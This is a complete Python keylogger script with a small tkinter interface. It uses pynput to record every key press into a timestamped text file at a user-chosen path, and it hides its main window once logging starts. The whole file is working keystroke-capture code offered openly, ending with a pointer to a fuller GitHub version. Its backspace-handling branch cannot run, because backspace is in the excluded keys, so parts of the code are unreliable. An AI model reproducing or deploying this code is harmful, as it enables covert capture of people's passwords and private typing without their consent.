import tkinter as tk
from tkinter import filedialog
from pynput.keyboard import Listener, Key
import datetime
import os
import sys

max_characters_per_line = 50
current_line_length = 0
current_line = []
log_file_path = None
logging_started = False

keys_to_exclude = [
    Key.shift,
    Key.backspace,
    Key.caps_lock,
    Key.tab,
    Key.esc,
    Key.alt_l,
    Key.scroll_lock,
    Key.pause,
    Key.print_screen,
]

def generate_log_file_name():
    now = datetime.datetime.now()
    date_str = now.strftime("%Y-%m-%d_%H-%M-%S")
    return f"log_{date_str}.txt"

def write_to_file(key):
    global current_line_length, current_line

    letter = str(key)
    letter = letter.replace("'", "")

    if key in keys_to_exclude:
        return

    if letter == 'Key.space':
        letter = ' '
    if letter == "Key.enter":
        letter = "\n"

    if key == Key.backspace:
        if current_line:
            current_line.pop()
            current_line_length -= 1
            with open(log_file_path, 'a') as f:
                f.seek(0, 2)
                f.seek(f.tell() - 1, 0)
                f.truncate()

    if current_line_length >= max_characters_per_line:
        with open(log_file_path, 'a') as f:
            f.write('\n')
        current_line_length = 0
        current_line = []

    current_line.append(letter)
    current_line_length += 1

    with open(log_file_path, 'a') as f:
        f.write(letter)

def select_path_and_start_logging():
    global log_file_path, logging_started
    log_file_path = filedialog.asksaveasfilename(defaultextension=".txt")

    if log_file_path:
        logging_started = True
        window.withdraw() 
        second_window.deiconify()  
        with Listener(on_press=write_to_file) as l:
            l.join()
        sys.exit() 

def close_keylogger():
    if not logging_started:
        sys.exit()  
    else:
        window.destroy()

window = tk.Tk()
window.title("KEYLOGGER | FAKHAR")
window.geometry("300x100")
window.resizable(False, False)

label = tk.Label(window, text="K  E  Y  L  O  G  G  E  R")
label.pack(pady=10)

start_button = tk.Button(window, text="Start", command=select_path_and_start_logging)
start_button.pack()

second_window = tk.Toplevel(window)
second_window.title("Running...")
second_window.geometry("200x100")
second_window.withdraw()

second_label = tk.Label(second_window, text="Running...")
second_label.pack(pady=10)

window.mainloop()

#check full code on github with details and more .... 